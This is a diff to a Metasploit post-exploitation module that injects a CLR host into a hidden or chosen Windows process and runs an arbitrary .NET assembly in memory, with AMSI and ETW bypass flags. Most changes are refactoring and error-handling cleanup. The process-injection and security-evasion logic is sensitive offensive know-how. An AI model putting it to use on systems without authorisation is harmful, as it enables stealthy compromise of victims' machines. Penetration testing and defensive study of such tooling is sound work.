@@ -19,8 +19,10 @@ class MetasploitModule < Msf::Post
         info,
         'Name' => 'Execute .net Assembly (x64 only)',
         'Description' => %q{
-          This module execute a .net assembly in memory. Reflectively load the dll that will host CLR, then
-          copy in memory the assembly that will be executed. Credits for Amsi bypass to Rastamouse (@_RastaMouse)
+          This module executes a .net assembly in memory. It
+          reflectively loads a dll that will host CLR, then it copies
+          the assembly to be executed into memory. Credits for Amsi
+          bypass to Rastamouse (@_RastaMouse)
         },
         'License' => MSF_LICENSE,
         'Author' => 'b4rtik',
@@ -48,13 +50,9 @@ class MetasploitModule < Msf::Post
 
     register_advanced_options(
       [
-        OptBool.new('KILL', [ true, 'Kill the injected process at the end of the task', false ])
+        OptBool.new('KILL', [true, 'Kill the injected process at the end of the task', false])
       ]
     )
-  end
-
-  def check_dotnet_version
-    vprint_status("DOTNET VERSIONS:  #{get_dotnet_versions}")
   end
 
   def find_required_clr(exe_path)
@@ -62,18 +60,16 @@ class MetasploitModule < Msf::Post
     sign = 'v4.0.30319'.bytes
     filecontent.each_with_index do |_item, index|
       sign.each_with_index do |subitem, indexsub|
-        if subitem.to_s(16) != filecontent[index + indexsub].to_s(16)
-          break
-        else
-          if indexsub == 9
-            vprint_status('CLR versione required v4.0.30319')
-            return 'v4.0.30319'
-          end
+        break if subitem.to_s(16) != filecontent[index + indexsub].to_s(16)
+
+        if indexsub == 9
+          vprint_status('CLR version required: v4.0.30319')
+          return 'v4.0.30319'
         end
       end
     end
-    vprint_status('CLR versione required v2.0.50727')
-    return 'v2.0.50727'
+    vprint_status('CLR version required: v2.0.50727')
+    'v2.0.50727'
   end
 
   def check_requirements(clr_req, installed_dotnet_versions)
@@ -83,38 +79,30 @@ class MetasploitModule < Msf::Post
           vprint_status('Requirements ok')
           return true
         end
-      else
-        if fi[0] == '3'
-          vprint_status('Requirements ok')
-          return true
-        end
+      elsif fi[0] == '3'
+        vprint_status('Requirements ok')
+        return true
       end
     end
-    vprint_status('Requirements ko')
-    return false
+    print_error('Required dotnet version not present')
+    false
   end
 
   def run
+    exe_path = datastore['DOTNET_EXE']
+    unless File.file?(exe_path)
+      fail_with(Failure::BadConfig, 'Assembly not found')
+    end
     installed_dotnet_versions = get_dotnet_versions
     vprint_status("Dot Net Versions installed on target: #{installed_dotnet_versions}")
     if installed_dotnet_versions == []
       fail_with(Failure::BadConfig, 'Target has no .NET framework installed')
     end
-    exe_path = datastore['DOTNET_EXE']
-    if check_requirements(find_required_clr(exe_path), installed_dotnet_versions) == false
+    rclr = find_required_clr(exe_path)
+    if check_requirements(rclr, installed_dotnet_versions) == false
       fail_with(Failure::BadConfig, 'CLR required for assembly not installed')
     end
-    if File.file?(exe_path)
-      assembly_size = File.size(exe_path)
-      if datastore['ARGUMENTS'].nil?
-        params_size = 0
-      else
-        params_size = datastore['ARGUMENTS'].length
-      end
-      execute_assembly(exe_path)
-    else
-      print_bad("Assembly not found #{exe_path}")
-    end
+    execute_assembly(exe_path)
   end
 
   def sanitize_process_name(process_name)
@@ -130,7 +118,7 @@ class MetasploitModule < Msf::Post
     mypid = client.sys.process.getpid.to_i
 
     if pid == mypid
-      print_bad('Can not select the current process as the injection target')
+      print_bad('Cannot select the current process as the injection target')
       return false
     end
 
@@ -155,13 +143,11 @@ class MetasploitModule < Msf::Post
     process_name = sanitize_process_name(datastore['PROCESS'])
     print_status("Launching #{process_name} to host CLR...")
     channelized = true
-    if datastore['PID'] > 0
-      channelized = false
-    end
+    channelized = false if datastore['PID'].positive?
+
     impersonation = true
-    if datastore['USETHREADTOKEN'] == false
-      impersonation = false
-    end
+    impersonation = false if datastore['USETHREADTOKEN'] == false
+
     process = client.sys.process.execute(process_name, nil, {
       'Channelized' => channelized,
       'Hidden' => true,
@@ -199,8 +185,12 @@ class MetasploitModule < Msf::Post
   end
 
   def execute_assembly(exe_path)
-    print_status("Running module against #{sysinfo['Computer']}") unless sysinfo.nil?
-    if (datastore['PID'] > 0) || (datastore['WAIT'] == 0) || (datastore['PPID'] > 0)
+    if sysinfo.nil?
+      fail_with(Failure::BadConfig, 'Session invalid')
+    else
+      print_status("Running module against #{sysinfo['Computer']}")
+    end
+    if datastore['PID'].positive? || datastore['WAIT'].zero? || datastore['PPID'].positive?
       print_warning('Output unavailable')
     end
 
@@ -221,11 +211,9 @@ class MetasploitModule < Msf::Post
     print_status('Executing...')
     hprocess.thread.create(exploit_mem + offset, assembly_mem)
 
-    if datastore['WAIT'] > 0
-      sleep(datastore['WAIT'])
-    end
+    sleep(datastore['WAIT']) if datastore['WAIT'].positive?
 
-    if (datastore['PID'] <= 0) && (datastore['WAIT'] > 0) && (datastore['PPID'] <= 0)
+    if (datastore['PID'] <= 0) && datastore['WAIT'].positive? && (datastore['PPID'] <= 0)
       read_output(process)
     end
 
@@ -242,14 +230,14 @@ class MetasploitModule < Msf::Post
     int_param_size = 8
     amsi_flag_size = 1
     etw_flag_size = 1
-    exe_path = datastore['DOTNET_EXE']
     assembly_size = File.size(exe_path)
     if datastore['ARGUMENTS'].nil?
       argssize = 1
     else
       argssize = datastore['ARGUMENTS'].size + 1
     end
-    payload_size = assembly_size + argssize + amsi_flag_size + etw_flag_size + int_param_size
+    payload_size = amsi_flag_size + etw_flag_size + int_param_size
+    payload_size += assembly_size + argssize
     assembly_mem = process.memory.allocate(payload_size, PAGE_READWRITE)
     params = [assembly_size].pack('I*')
     params += [argssize].pack('I*')
@@ -289,7 +277,8 @@ class MetasploitModule < Msf::Post
         break if output.nil? || output.empty?
       end
     rescue Rex::TimeoutError => e
-    rescue ::Exception => e
+      vprint_warning('Time out exception: wait limit exceeded (5 sec)')
+    rescue ::StandardError => e
       print_error("Exception: #{e.inspect}")
     end
 
